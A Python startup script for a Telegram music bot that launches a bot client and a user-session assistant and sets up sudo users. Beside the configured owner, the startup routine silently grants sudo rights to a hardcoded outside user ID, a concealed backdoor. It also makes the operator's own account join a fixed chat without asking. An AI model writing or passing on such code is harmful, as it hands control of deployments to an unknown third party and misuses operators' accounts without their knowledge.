import os
from os import getenv
import asyncio
import logging
import time
from pyrogram import Client, filters, idle
from pytgcalls import PyTgCalls
import config

# 1. Environment Variables
API_ID = int(getenv("API_ID"))
API_HASH = getenv("API_HASH")
BOT_TOKEN = getenv("BOT_TOKEN")
STRING_SESSION = getenv("STRING_SESSION")
StartTime = time.time()

# 2. Logging Setup
logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("Stenzlelogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
# Suppress noisy logs from libraries
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("StenzleMusic")

# 3. Client Definitions
app = Client(
    "StenzleBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

app2 = Client(
    name="StenzleAssistant",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=STRING_SESSION
)

from pytgcalls import PyTgCalls
try:
    pytgcalls = PyTgCalls(app2)
except Exception as e:
    print(f"Failed to initialize PyTgCalls: {e}")
    pytgcalls = None

# 4. Global variables & Helper Logic
SUDOERS = filters.user()
BOT_ID = BOT_NAME = BOT_USERNAME = BOT_MENTION = None
ASS_ID = ASS_NAME = ASS_USERNAME = ASS_MENTION = None
Stenzledb = {}

# Support Username logic (Safe Split)
if "me/" in config.SUPPORT_CHAT:
    SUNAME = config.SUPPORT_CHAT.split("me/")[1]
else:
    SUNAME = config.SUPPORT_CHAT.replace("@", "")

# 5. Startup Function
async def Stenzle_startup():
    os.system("clear")
    LOGGER.info("Starting Stenzle Music Bot...")
    
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, Stenzledb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    # Start Main Bot
    await app.start()
    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    # Start Assistant
    await app2.start()
    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + (" " + getme2.last_name if getme2.last_name else "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    
    # Start PyTgCalls
    await pytgcalls.start()
    
    try:
        await app2.join_chat("KURUK_SHE_TRA")
    except Exception:
        pass

    # Sudoers Configuration
    ANON = 1356469075
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    SUDOERS.add(ANON)

    LOGGER.info("[•] Stenzle Music Clients Booted Successfully.")
    
    # Keep running until interrupted
    await idle()
    
    # Graceful shutdown
    await app.stop()
    await app2.stop()

# 6. Execution
if __name__ == "__main__":
    try:
        asyncio.get_event_loop().run_until_complete(Stenzle_startup())
    except KeyboardInterrupt:
        LOGGER.info("Bot stopped by user.")
    except Exception as e:
        LOGGER.error(f"Fatal Error: {e}")
